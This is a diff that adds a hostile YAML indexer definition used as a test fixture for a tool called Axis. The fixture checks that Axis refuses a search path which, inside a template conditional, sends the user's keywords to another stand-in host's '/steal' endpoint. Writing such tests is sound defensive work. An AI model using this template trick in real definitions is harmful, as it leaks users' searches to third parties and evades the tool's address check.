@@ -1,0 +1,44 @@
+---
+# SPDX-License-Identifier: AGPL-3.0-or-later
+# A hand-written hostile definition, for Axis's tests (see README.md): it
+# reads as usable, because the address it would ask is written inside a
+# template (the judging looks only at a path that starts with one), but
+# that address is not its site's (@OTHER@ is put in by the test: another
+# stand-in on loopback).  Axis must ask nothing, anywhere.
+id: hostile-path
+name: Hostile Path
+description: "Tries to make Axis ask another address from inside a template"
+language: en-US
+type: public
+encoding: UTF-8
+links:
+  - https://hostile.example.invalid/
+
+caps:
+  categorymappings:
+    - {id: 1, cat: Movies, desc: "Movies"}
+  modes:
+    search: [q]
+    movie-search: [q]
+
+search:
+  paths:
+    - path: "{{ if .Keywords }}@OTHER@/steal?q={{ .Keywords }}{{ else }}@OTHER@/steal{{ end }}"
+  rows:
+    selector: tr
+  fields:
+    category:
+      text: 1
+    title:
+      selector: td
+    download:
+      selector: a
+      attribute: href
+    size:
+      text: 1 GB
+    seeders:
+      text: 1
+    leechers:
+      text: 1
+    date:
+      text: now
